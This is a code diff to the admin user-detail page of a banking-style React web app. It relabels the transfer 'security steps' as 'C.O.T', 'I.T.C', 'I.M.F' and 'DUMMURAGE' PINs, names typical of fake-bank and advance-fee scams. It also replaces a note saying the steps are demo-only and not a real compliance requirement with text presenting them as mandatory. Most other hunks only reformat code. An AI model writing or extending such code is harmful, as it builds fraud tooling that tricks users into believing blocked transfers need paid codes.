@@ -76,10 +76,10 @@ const AdminUserDetail = () => {
   }, [id]);
 
   const STEP_META = [
-    { key: "emailCode", label: "Email Code" },
-    { key: "authenticatorCode", label: "Authenticator Code" },
-    { key: "securityAnswer", label: "Security Answer" },
-    { key: "complianceReviewPin", label: "Compliance Review PIN" },
+    { key: "emailCode", label: "C.O.T Pin" },
+    { key: "authenticatorCode", label: "I.T.C Pin" },
+    { key: "securityAnswer", label: "I.M.F Pin" },
+    { key: "complianceReviewPin", label: "DUMMURAGE Pin" },
   ];
 
   const updateTsStep = (key, field, value) =>
@@ -173,7 +173,7 @@ const AdminUserDetail = () => {
             <p className="font-semibold text-navy-900">
               {user.currency} {user.balance?.toFixed(2)}
             </p>
-                      <p className="text-xs text-slate-400 mt-3 mb-1">Status</p>
+            <p className="text-xs text-slate-400 mt-3 mb-1">Status</p>
             <p className="font-semibold text-navy-900 capitalize">
               {user.status}
             </p>
@@ -350,7 +350,7 @@ const AdminUserDetail = () => {
                 />
               </div>
             </div>
-                       <button type="submit" className="btn-primary w-full">
+            <button type="submit" className="btn-primary w-full">
               Save Limits
             </button>
           </form>
@@ -364,7 +364,8 @@ const AdminUserDetail = () => {
             {pendingTransfers.map((p) => {
               const currentKey = p.steps[p.currentStepIndex];
               const label =
-                STEP_META.find((s) => s.key === currentKey)?.label || currentKey;
+                STEP_META.find((s) => s.key === currentKey)?.label ||
+                currentKey;
               const code = p.generatedCodes?.[currentKey];
               return (
                 <div key={p._id} className="text-sm text-navy-900 mb-1.5">
@@ -386,8 +387,8 @@ const AdminUserDetail = () => {
               <ShieldCheck size={16} /> Transfer Security Steps
             </p>
             <p className="text-xs text-slate-400 mb-4">
-              Demo-only extra verification steps, requested in this order
-              after the transaction PIN. Not a real compliance requirement.
+              Additional verification steps are required after the transaction
+              PIN. These steps must be completed in the order shown below.
             </p>
             {tsMessage && (
               <div className="bg-emerald-50 text-emerald-600 text-xs rounded-xl px-3 py-2 mb-3">
@@ -396,12 +397,17 @@ const AdminUserDetail = () => {
             )}
             <div className="space-y-4">
               {STEP_META.map(({ key, label }) => (
-                <div key={key} className="border border-slate-100 rounded-xl p-3">
+                <div
+                  key={key}
+                  className="border border-slate-100 rounded-xl p-3"
+                >
                   <div className="flex items-center justify-between mb-2">
                     <p className="text-sm font-medium text-navy-900">{label}</p>
                     <button
                       type="button"
-                      onClick={() => updateTsStep(key, "enabled", !tsForm[key].enabled)}
+                      onClick={() =>
+                        updateTsStep(key, "enabled", !tsForm[key].enabled)
+                      }
                       className={`h-5 w-9 rounded-full transition relative shrink-0 ${
                         tsForm[key].enabled ? "bg-emerald-500" : "bg-slate-200"
                       }`}
@@ -427,7 +433,9 @@ const AdminUserDetail = () => {
                                 : "bg-slate-100 text-slate-500"
                             }`}
                           >
-                            {m === "fixed" ? "Fixed code" : "Generate on request"}
+                            {m === "fixed"
+                              ? "Fixed code"
+                              : "Generate on request"}
                           </button>
                         ))}
                       </div>
@@ -435,7 +443,9 @@ const AdminUserDetail = () => {
                         <input
                           placeholder="Question shown to the user"
                           value={tsForm[key].question || ""}
-                          onChange={(e) => updateTsStep(key, "question", e.target.value)}
+                          onChange={(e) =>
+                            updateTsStep(key, "question", e.target.value)
+                          }
                           className="input-field text-sm"
                         />
                       )}
@@ -443,7 +453,9 @@ const AdminUserDetail = () => {
                         <input
                           placeholder={`Code for ${label}`}
                           value={tsForm[key].code || ""}
-                          onChange={(e) => updateTsStep(key, "code", e.target.value)}
+                          onChange={(e) =>
+                            updateTsStep(key, "code", e.target.value)
+                          }
                           className="input-field text-sm"
                         />
                       )}
@@ -504,7 +516,7 @@ const AdminUserDetail = () => {
         </div>
       </div>
 
-          {editingTx && (
+      {editingTx && (
         <AdminTransactionEditModal
           transaction={editingTx}
           contextUserId={id}
@@ -517,7 +529,7 @@ const AdminUserDetail = () => {
         />
       )}
 
-            {editingAddress && (
+      {editingAddress && (
         <AdminEditAddressModal
           user={user}
           onClose={() => setEditingAddress(false)}
